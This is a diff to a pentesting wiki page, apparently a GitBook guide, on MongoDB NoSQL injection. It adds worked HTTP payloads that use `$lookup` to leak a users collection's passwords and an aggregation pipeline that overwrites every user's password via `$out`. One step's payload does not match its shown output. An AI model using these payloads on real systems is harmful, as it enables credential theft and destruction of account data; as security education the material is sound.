@@ -6,7 +6,7 @@ description: >-
 
 # NoSQL Injection
 
-While SQL Injection in the traditional sense is not possible, there are still some new opportunities for vulnerabilities that NoSQL introduces. Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.&#x20;
+While SQL Injection in the traditional sense may not be possible, there are still some new opportunities for vulnerabilities that NoSQL introduces in **MongoDB**. Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.&#x20;
 
 Often the goal is to bypass some login screen, by returning an always-true request. Sometimes you want to get more specific records or try to extract data.&#x20;
 
@@ -92,7 +92,7 @@ Often in a NoSQL injection, you are returning an always-true response to get thr
 
 To return specifically that user, you can provide a unique thing about that user if you know it, like a username, while keeping the password always true.&#x20;
 
-If you don't know anything about other users, you can also simply exclude any user you don't want with the `$nin` keyword, and an array:
+If you don't know anything about other users, you can also simply exclude any user you don't want with the `$nin` (Not IN) keyword, and an array:
 
 {% code title="URL parameters" %}
 ```php
@@ -163,6 +163,257 @@ def search(test_function):
 password = search(test_password)
 print(password)
 ```
+
+## Full injections
+
+Sometimes, you may have a larger injection where you **control the whole query**. You can recognize this commonly by a [`$match`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/match/) key in your original input query that the application sends by itself. The server may have an API endpoint for easy querying of products:
+
+```json
+POST /api/products HTTP/1.1
+Content-Type: application/json
+...
+
+[{
+  "$match": {
+    "instock": true
+  }
+}]
+```
+
+### Aggregate functions (`$match` -> `$lookup`)
+
+The front end may always use the `$match` aggregation, but we as the attacker can use different keywords to perform different actions. A useful one is [`$lookup`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) which performs a JOIN operation between two collections. This means the response JSON will include extra keys you define from another collection.&#x20;
+
+The JOIN operation combines collections but does so conditionally. You need to provide one key from the original collection and one from the new collection. Where these keys are the same, all values of the new collection are added to the response. Often you want to do this with the `_id` key if the products are numbered 1,2,3... and your users are as well. Then every `n`th product will also include the `n`th user:
+
+{% tabs %}
+{% tab title="Request" %}
+In this attack we try to fetch from the `users` collection where the product `_id` matches with the users `_id`
+
+<pre class="language-json"><code class="lang-json">POST /api/products HTTP/1.1
+Content-Type: application/json
+...
+
+[{
+  "$lookup": {
+<strong>    "from": "users",
+</strong>    "localField": "_id",
+    "foreignField": "_id",
+    "as": "leak"
+  }
+}]
+</code></pre>
+{% endtab %}
+
+{% tab title="Response" %}
+<pre class="language-json"><code class="lang-json">HTTP/1.1 200 OK
+...
+
+[
+  {
+    "_id": 2,
+    "name": "Second product",
+    "price": "1.99",
+    "instock": false,
+<strong>    "leak": [{ "_id": 2, "username": "user", "password": "hunter2" }]
+</strong>  },
+  {
+    "_id": 1,
+    "name": "First product",
+    "price": "2.99",
+    "instock": true,
+<strong>    "leak": [{ "_id": 1, "username": "admin", "password": "P@ssw0rd"}]
+</strong>  }
+]
+</code></pre>
+
+Notice the leak happens when the `_id` matches, because we set our `localField` and `foreignField` to this in the injection
+{% endtab %}
+{% endtabs %}
+
+The above method requires the collections to have a key in common, which is not always the case. However, there is another more advanced method to JOIN on any condition, using the `"pipeline"` key. This allows you to write another custom query where you can match anything, like `_id` not being empty in the new collection. In the leak, it will now contain every document in the collection at once:
+
+{% tabs %}
+{% tab title="Request" %}
+```json
+POST /api/products HTTP/1.1
+Content-Type: application/json
+...
+
+[{
+  "$lookup": {
+    "from": "users",
+    "pipeline": [{ "$match": { "_id" : {"$ne": ""}  } }],
+    "as": "leak"
+  }
+}]
+```
+{% endtab %}
+
+{% tab title="Response" %}
+```json
+HTTP/1.1 200 OK
+...
+
+[
+  {
+    "_id": 4,
+    "name": "Second product",
+    "price": "1.99",
+    "instock": false,
+    "leak": [
+      { "_id": 1, "username": "admin", "password": "P@ssw0rd" },
+      { "_id": 2, "username": "user", "password": "hunter2" }
+    ]
+  },
+  {
+    "_id": 3,
+    "name": "First product",
+    "price": "2.99",
+    "instock": true,
+    "leak": [
+      { "_id": 1, "username": "admin", "password": "P@ssw0rd" },
+      { "_id": 2, "username": "user", "password": "hunter2" }
+    ]
+  }
+]
+```
+{% endtab %}
+{% endtabs %}
+
+### Write data
+
+You can do a lot with NoSQL Injection when you control the query. You might expect a `query` to only retrieve data, but with large enough control over the query you can actually alter collections and write them out to the database. By combining multiple operators we can do the following:
+
+1. `$skip`: Get rid of any original response (`products`), to create an empty list
+2. `$unionWith`: Add all documents from the `users` collection to the response
+3. `$set`: Alter specific keys in the response, and write our data
+4. `$out`: Write the response to a collection, overwriting all data
+
+All of these combined into a payload will allow you to go from a `products` query, to overwriting any data in the `users` collection. You could for example set the `"password": "hacked"` for all users, including yourself:
+
+```json
+[
+  {"$skip": 999},
+  {"$unionWith": "users"},
+  {"$set": {"password": "hacked"}},
+  {"$out": "users"}
+]
+```
+
+The above query will create an altered `users` collection and write it. Here is a step-by-step walkthrough of the response:
+
+{% tabs %}
+{% tab title="0. Start" %}
+```json
+[]
+```
+
+{% code title="Response" %}
+```json
+[
+  {
+    "_id": 2,
+    "name": "Second product",
+    "price": "1.99",
+    "instock": false,
+  },
+  {
+    "_id": 1,
+    "name": "First product",
+    "price": "2.99",
+    "instock": true,
+  }
+]
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="1. $skip" %}
+```json
+  {"$skip": 999},
+```
+
+{% code title="Response" %}
+```json
+[]
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="2. $unionWith" %}
+```json
+  {"$unionWith": "users"},
+```
+
+{% code title="Response" %}
+```json
+[
+  {
+    "_id": 1,
+    "username": "admin",
+    "password": "P@ssw0rd"
+  },
+  {
+    "_id": 2,
+    "username": "user",
+    "password": "hunter2"
+  }
+]
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="3. $set" %}
+```json
+  {"$set": {"role": "admin"}},
+```
+
+{% code title="Response" %}
+```json
+[
+  {
+    "_id": 1,
+    "username": "admin",
+    "password": "hacked"
+  },
+  {
+    "_id": 2,
+    "username": "user",
+    "password": "hacked"
+  }
+]
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="4. $out" %}
+```json
+  {"$out": "users"}
+```
+
+Empty response, but the `users` collection is now saved as:
+
+```json
+[
+  {
+    "_id": 1,
+    "username": "admin",
+    "password": "hacked"
+  },
+  {
+    "_id": 2,
+    "username": "user",
+    "password": "hacked"
+  }
+]
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="warning" %}
+This can also be really useful in further attacks by inserting data some other system doesn't expect. Such as XSS, Insecure Deserialisation, or more injection attacks
+{% endhint %}
 
 ## Filter Bypass
 
